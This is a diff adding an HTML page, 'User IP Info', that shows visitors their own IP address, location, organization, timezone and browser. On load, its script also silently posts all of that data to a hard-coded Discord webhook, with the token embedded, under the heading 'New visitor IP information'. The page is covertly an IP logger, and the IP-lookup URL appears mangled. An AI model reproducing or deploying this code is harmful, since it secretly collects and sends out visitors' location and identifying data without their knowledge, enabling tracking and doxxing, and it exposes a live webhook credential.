@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User IP Info</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        #ip-info {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            font-size: 24px;
+        }
+        p {
+            font-size: 18px;
+        }
+    </style>
+</head>
+ 
+<body>
+    <div id="ip-info">
+        <h1>Your IP Information</h1>
+        <p id="ip">Loading...</p>
+        <p id="location"></p>
+        <p id="org"></p>
+        <p id="asn"></p>
+        <p id="timezone"></p>
+        <p id="browser"></p>
+    </div>
+ 
+    <script>
+        async function fetchIPInfo() {
+            try {
+                const response = await fetch('9b305f8f80a09f');
+                const data = await response.json();
+ 
+                // Display IP info on the page
+                document.getElementById('ip').textContent = `IP: ${data.ip}`;
+                document.getElementById('location').textContent = `Location: ${data.city}, ${data.region}, ${data.country}`;
+                document.getElementById('org').textContent = `Organization: ${data.org}`;
+                document.getElementById('asn').textContent = `ASN: ${data.org.split(' ')[0]}`; // Extract ASN from the org field
+                document.getElementById('timezone').textContent = `Timezone: ${data.timezone}`;
+ 
+                // Get and display browser info
+                const browserInfo = getBrowserInfo();
+                document.getElementById('browser').textContent = `Browser: ${browserInfo}`;
+ 
+                // Send IP info to Discord webhook
+                const webhookUrl = 'https://discord.com/api/webhooks/1248769335414231040/HBaurBO4HU5UeaNdmjqxsaBfRnzN6rxXeUYHYGgpNVHw1LKKUOV5w4HA3eNItOeYCepJ';
+                const message = {
+                    content: `New visitor IP information:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nOrganization: ${data.org}\nASN: ${data.org.split(' ')[0]}\nTimezone: ${data.timezone}\nBrowser: ${browserInfo}`
+                };
+ 
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+ 
+            } catch (error) {
+                document.getElementById('ip-info').textContent = 'Looks like youve run into an error.';
+            }
+        }
+ 
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browserName = "Unknown";
+ 
+            if (userAgent.match(/chrome|chromium|crios/i)) {
+                browserName = "Chrome";
+            } else if (userAgent.match(/firefox|fxios/i)) {
+                browserName = "Firefox";
+            } else if (userAgent.match(/safari/i)) {
+                browserName = "Safari";
+            } else if (userAgent.match(/opr\//i)) {
+                browserName = "Opera";
+            } else if (userAgent.match(/edg/i)) {
+                browserName = "Edge";
+            } else if (userAgent.match(/msie|trident/i)) {
+                browserName = "Internet Explorer";
+            }
+ 
+            return browserName + ' ' + navigator.appVersion;
+        }
+ 
+        fetchIPInfo();
+    </script>
+</body>
+</html>
